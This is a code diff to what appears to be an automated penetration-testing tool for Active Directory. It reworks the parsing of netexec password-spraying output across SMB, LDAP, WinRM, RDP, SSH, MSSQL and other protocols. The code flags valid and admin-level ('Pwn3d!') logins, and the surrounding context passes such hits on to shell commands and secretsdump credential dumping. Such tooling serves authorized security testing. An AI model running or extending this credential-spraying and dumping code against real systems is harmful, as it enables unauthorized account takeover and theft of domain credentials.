@@ -1113,20 +1113,27 @@ def _spray_targets(out):
 # the password is correct, only a login/change policy blocks the session.
 _NXC_VALID_STATUS = ("STATUS_PASSWORD_MUST_CHANGE","STATUS_PASSWORD_EXPIRED",
                      "STATUS_LOGON_TYPE_NOT_GRANTED","STATUS_ACCOUNT_RESTRICTION")
-_NXC_LINE = re.compile(r"(?im)^\s*(SMB|LDAP|WINRM)\s+\S+\s+\d+\s+\S+\s+\[([+\-])\]\s+(\S+)(.*)$")
+_NXC_PROTOS = r"SMB|LDAP|WINRM|RDP|SSH|FTP|WMI|MSSQL"
 
 def _parse_nxc(o):
-    """netexec-Output -> Liste dict(user, status, admin). Valide = [+] ODER must-change/restricted."""
+    """netexec output -> list of dict(user, status, admin). Valid = [+] OR
+    must-change/restricted. Lenient + ANSI-stripped (nxc may colorize)."""
+    o = _ANSI.sub("", o or "")
     hits = []
-    for m in _NXC_LINE.finditer(o or ""):
-        sign, blob, rest = m.group(2), m.group(3), m.group(4)
-        sm = re.search(r"STATUS_\w+", rest)
-        status = sm.group(0) if sm else ""
-        admin = "(Pwn3d!)" in rest
-        if not ((sign == "+") or (status in _NXC_VALID_STATUS)):
+    for line in o.splitlines():
+        if not re.match(rf"\s*(?:{_NXC_PROTOS})\b", line, re.I):
             continue
-        up = blob.split("\\",1)[-1]          # dom\user:pass -> user:pass
-        user = up.split(":",1)[0]
+        sm = re.search(r"STATUS_[A-Z_]+", line)
+        status = sm.group(0) if sm else ""
+        admin = "(Pwn3d!)" in line
+        if not (("[+]" in line) or (status in _NXC_VALID_STATUS)):
+            continue
+        # grab the 'domain\user:pass' (or 'user:pass') token after the [+]/[-] marker
+        m = re.search(r"\[[+\-]\]\s+(\S+)", line)
+        if not m:
+            continue
+        up = m.group(1).split("\\", 1)[-1]        # dom\user:pass -> user:pass
+        user = up.split(":", 1)[0]
         if user:
             hits.append({"user": user, "status": status, "admin": admin})
     return hits
@@ -1138,7 +1145,11 @@ def _ad_protos(svcmap):
     if "5985" in svcmap or "5986" in svcmap: protos.append("winrm")
     return protos
 
-_NXC_PROTO_LINE = re.compile(r"(?im)^\s*(SMB|LDAP|WINRM)\s+\S+\s+\d+\s")
+def _nxc_connected(o):
+    """True if nxc actually spoke the protocol (produced a banner line)."""
+    o = _ANSI.sub("", o or "")
+    return bool(re.search(rf"(?im)^\s*(?:{_NXC_PROTOS})\s+\S+\s+\d+\s", o))
+
 def _nxc_call(nxc, proto, targets, authargs, timeout):
     """Run nxc, trying targets in order (FQDN/domain first, IP last). LDAP against a
     signing-required DC fails by IP, so the hostname is what makes must-change show up.
@@ -1151,7 +1162,7 @@ def _nxc_call(nxc, proto, targets, authargs, timeout):
         if hits:
             return o, hits, tgt
         # protocol lines but no valid login -> a genuine miss, don't retry other targets
-        if _NXC_PROTO_LINE.search(o or ""):
+        if _nxc_connected(o):
             return o, [], tgt
         # no protocol lines at all -> connection/resolve failure, try the next target
     return last, [], (targets[-1] if targets else "")
@@ -1215,11 +1226,16 @@ def spray_creds(ip, svcmap, out, host=""):
                                 raw("shell "+ln, "spray")
                             secretsdump(ip, u, secret, kind, dom, out)
                     if not hits:
-                        err_hint = re.search(r"(?im)\[-\]\s*(.*(?:error|fail|refused|timeout)"
-                                             r".*)$", o or "")
-                        info("  no valid logins" + (f" ({err_hint.group(1).strip()[:80]})"
-                             if err_hint else ""), "spray")
-                        if o and o.strip(): dbg(o.strip().splitlines()[-1][:160], "spray")
+                        clean = _ANSI.sub("", o or "")
+                        if not _nxc_connected(clean):
+                            info("  nxc could not reach the service (connection/resolve)", "spray")
+                        else:
+                            info("  no valid logins", "spray")
+                        # always show a sample line so a miss is diagnosable
+                        sample = next((l.strip() for l in clean.splitlines()
+                                       if re.match(rf"\s*(?:{_NXC_PROTOS})\b", l, re.I)
+                                       and ("[-]" in l or "[+]" in l)), "")
+                        if sample: raw(sample[:180], "spray")
         finally:
             shutil.rmtree(tmp, ignore_errors=True)
     elif protos and not nxc:
